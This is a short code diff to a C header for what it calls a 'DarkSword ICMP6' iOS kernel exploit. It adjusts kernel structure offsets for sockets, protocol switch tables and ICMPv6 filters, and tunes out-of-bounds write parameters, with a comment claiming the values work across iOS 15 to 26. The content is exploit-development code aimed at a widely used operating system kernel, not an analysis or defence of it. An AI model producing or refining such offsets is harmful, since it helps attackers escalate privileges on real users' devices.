@@ -16,10 +16,12 @@
 #define PAGE_SIZE 0x4000ULL
 
 // ===== DarkSword ICMP6 exploit offsets =====
+// Values match the canonical darkSword-kexploit (opa334/saudgl ports),
+// verified working across iOS 15.x -> 26.x.
 #define OFFSET_PCB_SOCKET      0x40   // inpcb -> socket
-#define OFFSET_SOCKET_SO_COUNT 0x208  // socket retain count
-#define OFFSET_ICMP6FILT       0x138  // inpcb icmp6_filter pointer
-#define OFFSET_SO_PROTO        0x20   // socket -> protosw
+#define OFFSET_SOCKET_SO_COUNT 0x228  // socket retain count
+#define OFFSET_ICMP6FILT       (0x138 + 0x18)  // inpcb icmp6_filter pointer
+#define OFFSET_SO_PROTO        0x18   // socket -> protosw
 #define OFFSET_PR_INPUT        0x28   // protosw -> pr_input
 
 // ICMP6 socket option
@@ -27,7 +29,7 @@
 #define ICMP6_FILTER    18
 
 // ===== Exploit parameters =====
-#define OOB_PAGES_NUM  512
+#define OOB_PAGES_NUM  2
 #define OOB_SIZE       0xf00
 #define OOB_OFFSET     0x100
 
